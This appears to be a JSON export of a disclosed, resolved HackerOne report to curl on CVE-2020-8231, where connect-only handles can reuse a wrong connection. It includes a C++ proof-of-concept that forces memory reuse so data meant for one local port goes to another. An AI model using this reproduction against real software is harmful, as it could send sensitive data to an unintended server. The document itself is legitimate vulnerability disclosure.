@@ -1,0 +1,127 @@
+{
+  "id": 948876,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDg4NzY=",
+  "url": "https://hackerone.com/reports/948876",
+  "title": "CVE-2020-8231: Connect-only connections can use the wrong connection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-31T20:57:36.135Z",
+  "submitted_at": "2020-07-31T20:57:36.215Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "m42a",
+    "url": "/m42a",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8231"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-11-05T12:41:13.444Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-05T12:41:13.382Z",
+  "team_member_agreed_on_going_public_at": "2020-11-05T08:31:12.427Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nIf a connect-only easy handle is not read from or written to, its connection can time out and be closed.  If a new connection is created it can be allocated at the same address, causing the easy handle to use the new connection.  This new connection may not be connected to the same server as the old connection, which can allow sensitive information intended to go to the first server to instead go to the second server.\n\nThis sequence of events would be uncommon in ordinary usage, so I have attached a sample program that implements a simple caching allocator, which causes the address to be re-used deterministically.\n\nAccording to git bisect, this behavior was introduced in commit 755083d.\n\n## Steps To Reproduce:\n\n  1. Compile the source code below\n  1. Listen on ports 1234, 1235, and 1236\n  1. Run the compiled program\n  1. Notice that the data which was supposed to be sent to port 1234 is actually sent to port 1236\n\n## Supporting Material/References:\n```c++\n#include <iostream>\n#include <stdexcept>\n#include <thread>\n#include <chrono>\n#include <unordered_map>\n\n#include <string.h>\n\n#include <curl/curl.h>\n\nusing namespace std::literals;\n\nstatic void require(bool b)\n{\n\tif (!b)\n\t\tthrow std::runtime_error(\"Assertion failed\");\n}\n\nstruct alloc\n{\n\talloc *next_alloc;\n\tstd::size_t size;\n};\n\nstd::unordered_map<std::size_t, alloc *> cached_allocations;\n\nvoid *malloc_(size_t size)\n{\n\tauto &ptr = cached_allocations[size];\n\tif (ptr)\n\t{\n\t\tvoid *ret = (char *)ptr + sizeof(alloc);\n\t\tptr = ptr->next_alloc;\n\t\treturn ret;\n\t}\n\tauto new_ptr = (alloc *)calloc(1, size + sizeof(alloc));\n\tnew_ptr->next_alloc = nullptr;\n\tnew_ptr->size = size;\n\tvoid *ret = ((char *)new_ptr) + sizeof(alloc);\n\treturn ret;\n}\n\nvoid free_(void *ptr)\n{\n\tauto alloc_ptr = (alloc *)((char *)ptr - sizeof(alloc));\n\tauto &last_alloc = cached_allocations[alloc_ptr->size];\n\talloc_ptr->next_alloc = last_alloc;\n\tlast_alloc = alloc_ptr;\n}\n\nvoid *realloc_(void *ptr, size_t size)\n{\n\tauto alloc_ptr = (alloc *)((char *)ptr - sizeof(alloc));\n\tauto new_alloc_ptr = (alloc *)realloc(alloc_ptr, size + sizeof(alloc));\n\tnew_alloc_ptr->size = size;\n\treturn (char *)new_alloc_ptr + sizeof(alloc);\n}\n\nchar *strdup_(const char *str)\n{\n\tauto size = strlen(str) + 1;\n\tauto new_str = (char *)malloc(size);\n\treturn strcpy(new_str, str);\n}\n\nvoid *calloc_(size_t nmemb, size_t size)\n{\n\tauto full_size = nmemb*size;\n\treturn malloc_(full_size);\n}\n\n\nint main()\n{\n\tcurl_global_init_mem(CURL_GLOBAL_DEFAULT, &malloc_, &free_, &realloc_, &strdup_, &calloc_);\n\n\tauto multi = curl_multi_init();\n\trequire(multi);\n\n\tauto easy1234 = curl_easy_init();\n\trequire(easy1234);\n\tauto eret = curl_easy_setopt(easy1234, CURLOPT_URL, \"http://127.0.0.1:1234/\");\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1234, CURLOPT_CONNECT_ONLY, 1);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1234, CURLOPT_VERBOSE, 1L);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1234, CURLOPT_MAXAGE_CONN, 1L);\n\trequire(eret == CURLE_OK);\n\tauto mret = curl_multi_add_handle(multi, easy1234);\n\trequire(mret == CURLM_OK);\n\n\t// Create connection to port 1234\n\twhile (true)\n\t{\n\t\tint running;\n\t\tmret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, &running);\n\t\trequire(mret == CURLM_OK);\n\t\tint remaining;\n\t\tif (auto info = curl_multi_info_read(multi, &remaining))\n\t\t{\n\t\t\trequire(info->msg == CURLMSG_DONE);\n\t\t\trequire(info->easy_handle == easy1234);\n\t\t\trequire(info->data.result == CURLE_OK);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// Allow connection to port 1234 to age out\n\tstd::this_thread::sleep_for(2s);\n\n\tauto easy1235 = curl_easy_init();\n\trequire(easy1235);\n\teret = curl_easy_setopt(easy1235, CURLOPT_URL, \"http://127.0.0.1:1235/\");\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1235, CURLOPT_CONNECT_ONLY, 1);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1235, CURLOPT_VERBOSE, 1L);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1235, CURLOPT_MAXAGE_CONN, 1L);\n\trequire(eret == CURLE_OK);\n\tmret = curl_multi_add_handle(multi, easy1235);\n\trequire(mret == CURLM_OK);\n\n\t// Create connection to port 1235, then close connection to port 1234 as it is too old\n\twhile (true)\n\t{\n\t\tint running;\n\t\tmret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, &running);\n\t\trequire(mret == CURLM_OK);\n\t\tint remaining;\n\t\tif (auto info = curl_multi_info_read(multi, &remaining))\n\t\t{\n\t\t\trequire(info->msg == CURLMSG_DONE);\n\t\t\trequire(info->easy_handle == easy1235);\n\t\t\trequire(info->data.result == CURLE_OK);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tauto easy1236 = curl_easy_init();\n\trequire(easy1236);\n\teret = curl_easy_setopt(easy1236, CURLOPT_URL, \"http://127.0.0.1:1236/\");\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1236, CURLOPT_CONNECT_ONLY, 1);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1236, CURLOPT_VERBOSE, 1L);\n\trequire(eret == CURLE_OK);\n\teret = curl_easy_setopt(easy1236, CURLOPT_MAXAGE_CONN, 1L);\n\trequire(eret == CURLE_OK);\n\tmret = curl_multi_add_handle(multi, easy1236);\n\trequire(mret == CURLM_OK);\n\n\t// Create connection to port 1236, which re-uses the memory of the previous connection to port 1234\n\twhile (true)\n\t{\n\t\tint running;\n\t\tmret = curl_multi_socket_action(multi, CURL_SOCKET_TIMEOUT, 0, &running);\n\t\trequire(mret == CURLM_OK);\n\t\tint remaining;\n\t\tif (auto info = curl_multi_info_read(multi, &remaining))\n\t\t{\n\t\t\trequire(info->msg == CURLMSG_DONE);\n\t\t\trequire(info->easy_handle == easy1236);\n\t\t\trequire(info->data.result == CURLE_OK);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tchar c = 'a';\n\tsize_t n;\n\t// Attempts to send data to port 1234, but actually uses the connection to port 1236\n\teret = curl_easy_send(easy1234, &c, 1, &n);\n\trequire(eret == CURLE_OK);\n\n\tmret = curl_multi_remove_handle(multi, easy1236);\n\trequire(mret == CURLM_OK);\n\tmret = curl_multi_remove_handle(multi, easy1235);\n\trequire(mret == CURLM_OK);\n\tmret = curl_multi_remove_handle(multi, easy1234);\n\trequire(mret == CURLM_OK);\n\tmret = curl_multi_cleanup(multi);\n\trequire(mret == CURLM_OK);\n}\n```\n\n## Impact\n\nThis could cause sensitive data intended for one server to be transmitted to a different server.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-12-05T08:31:12.531Z",
+  "allow_singular_disclosure_after": -170586831.01966995,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "pat_ventuzelo",
+    "ali",
+    "tess",
+    "akashhamal0x01",
+    "term1nal",
+    "papa_sm1rf",
+    "brumbrum",
+    "aliasad1010",
+    "be91baf4ec5c715a0aae37a",
+    "hhdl",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
